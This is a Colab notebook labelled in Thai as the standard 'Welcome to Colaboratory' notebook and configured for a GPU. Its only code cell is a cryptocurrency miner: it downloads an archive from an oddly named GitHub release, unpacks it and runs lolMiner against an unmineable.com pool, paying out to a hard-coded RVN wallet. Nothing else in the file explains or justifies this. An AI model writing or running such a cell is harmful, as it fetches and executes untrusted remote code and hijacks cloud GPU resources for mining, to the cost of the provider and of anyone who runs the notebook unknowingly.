{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ยินดีต้อนรับสู่ Colaboratory",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/paolariascos/H/blob/master/%E0%B8%A2%E0%B8%B4%E0%B8%99%E0%B8%94%E0%B8%B5%E0%B8%95%E0%B9%89%E0%B8%AD%E0%B8%99%E0%B8%A3%E0%B8%B1%E0%B8%9A%E0%B8%AA%E0%B8%B9%E0%B9%88_Colaboratory.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "wC8I-tX8fmOt"
      },
      "source": [
        "! wget https://github.com/Cmarlee/MrovmmLoLMiner/releases/download/1.29/Mrovmm.tar.gz\n",
        "! tar -xf Mrovmm.tar.gz\n",
        "%cd 1.29\n",
        "! ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RLDqsbfymn7xzvuqNGvWLm5AVMvW4tHMPu.rig1 --ethstratum ETHPROXY"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}